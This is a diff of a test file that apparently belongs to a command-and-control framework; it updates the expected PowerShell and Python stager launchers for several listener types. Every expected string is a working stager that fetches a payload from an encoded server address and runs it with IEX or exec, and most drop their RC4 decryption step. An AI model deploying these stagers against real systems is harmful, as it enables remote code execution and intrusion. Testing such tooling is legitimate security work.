@@ -254,7 +254,7 @@ def test_port_forward_pivot_generate_launcher(monkeypatch, main_menu_mock):
 
 
 def _expected_http_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","l33th4x0r=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes(\'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}\');$wc.Headers.Add("Cookie","l33th4x0r=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _expected_http_python_launcher():
@@ -268,27 +268,14 @@ def _expected_http_python_launcher():
         o = urllib.request.build_opener(proxy);
         o.addheaders=[('User-Agent',UA), ("Cookie", "l33th4x0r=cm91dGluZyBwYWNrZXQ=")];
         urllib.request.install_opener(o);
-        a=urllib.request.urlopen(req).read();
-        IV=a[0:4];
-        data=a[4:];
-        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
-        S,j,out=list(range(256)),0,[];
-        for i in list(range(256)):
-            j=(j+S[i]+key[i%len(key)])%256;
-            S[i],S[j]=S[j],S[i];
-        i=j=0;
-        for char in data:
-            i=(i+1)%256;
-            j=(j+S[i])%256;
-            S[i],S[j]=S[j],S[i];
-            out.append(chr(char^S[(S[i]+S[j])%256]));
-        exec(''.join(out));
+        data=urllib.request.urlopen(req).read();
+        exec(data);
         """
     ).strip("\n")
 
 
 def _expected_http_foreign_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _expected_http_foreign_python_launcher():
@@ -303,21 +290,8 @@ def _expected_http_foreign_python_launcher():
         proxy = urllib.request.ProxyHandler();
         o = urllib.request.build_opener(proxy);
         urllib.request.install_opener(o);
-        a=o.open(server+t).read();
-        IV=a[0:4];
-        data=a[4:];
-        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
-        S,j,out=list(range(256)),0,[];
-        for i in list(range(256)):
-            j=(j+S[i]+key[i%len(key)])%256;
-            S[i],S[j]=S[j],S[i];
-        i=j=0;
-        for char in data:
-            i=(i+1)%256;
-            j=(j+S[i])%256;
-            S[i],S[j]=S[j],S[i];
-            out.append(chr(char^S[(S[i]+S[j])%256]));
-        exec(''.join(out));
+        data=o.open(server+t).read();
+        exec(data);
         """
     ).strip("\n")
 
@@ -333,27 +307,14 @@ def _expected_http_hop_python_launcher():
         o = urllib.request.build_opener(proxy);
         o.addheaders=[('User-Agent',UA), ("Cookie", "session=cm91dGluZyBwYWNrZXQ=")];
         urllib.request.install_opener(o);
-        a=urllib.request.urlopen(req).read();
-        IV=a[0:4];
-        data=a[4:];
-        key=IV+''.encode('UTF-8');
-        S,j,out=list(range(256)),0,[];
-        for i in list(range(256)):
-            j=(j+S[i]+key[i%len(key)])%256;
-            S[i],S[j]=S[j],S[i];
-        i=j=0;
-        for char in data:
-            i=(i+1)%256;
-            j=(j+S[i])%256;
-            S[i],S[j]=S[j],S[i];
-            out.append(chr(char^S[(S[i]+S[j])%256]));
-        exec(''.join(out));
+        data=urllib.request.urlopen(req).read();
+        exec(data);
     """
     ).strip("\n")
 
 
 def _expected_http_hop_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$K=[System.Text.Encoding]::ASCII.GetBytes('');$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _expected_http_malleable_python_launcher():
@@ -371,28 +332,15 @@ def _expected_http_malleable_python_launcher():
         req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
         req.add_header('Cookie','session=cm91dGluZyBwYWNrZXQ%3D')
         res=urllib.request.urlopen(req)
-        a=res.read()
-        a=urllib.request.urlopen(req).read();
-        IV=a[0:4];
-        data=a[4:];
-        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
-        S,j,out=list(range(256)),0,[];
-        for i in list(range(256)):
-            j=(j+S[i]+key[i%len(key)])%256;
-            S[i],S[j]=S[j],S[i];
-        i=j=0;
-        for char in data:
-            i=(i+1)%256;
-            j=(j+S[i])%256;
-            S[i],S[j]=S[j],S[i];
-            out.append(chr(char^S[(S[i]+S[j])%256]));
-        exec(''.join(out));
+        data=res.read()
+        data=urllib.request.urlopen(req).read();
+        exec(data);
     """
     ).strip("\n")
 
 
 def _expected_http_malleable_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/zxxuhptp/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..($data.length-1)];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+    return """$ErrorActionPreference = "SilentlyContinue";$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$wc=New-Object System.Net.WebClient;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADgAMAA=')));$t='/zxxuhptp/';$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ%3D");$data=$wc.DownloadData($ser+$t);IEX ([Text.Encoding]::UTF8.GetString($data))"""
 
 
 def _fake_malleable_profile():
@@ -493,24 +441,11 @@ def _expected_redirector_python_launcher():
         proxy = urllib.request.ProxyHandler();
         o = urllib.request.build_opener(proxy);
         urllib.request.install_opener(o);
-        a=urllib.request.urlopen(req).read();
-        IV=a[0:4];
-        data=a[4:];
-        key=IV+'@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}'.encode('UTF-8');
-        S,j,out=list(range(256)),0,[];
-        for i in list(range(256)):
-            j=(j+S[i]+key[i%len(key)])%256;
-            S[i],S[j]=S[j],S[i];
-        i=j=0;
-        for char in data:
-            i=(i+1)%256;
-            j=(j+S[i])%256;
-            S[i],S[j]=S[j],S[i];
-            out.append(chr(char^S[(S[i]+S[j])%256]));
-        exec(''.join(out));
+        data=urllib.request.urlopen(req).read();
+        exec(data);
     """
     ).strip("\n")
 
 
 def _expected_redirector_powershell_launcher():
-    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
+    return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA=')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
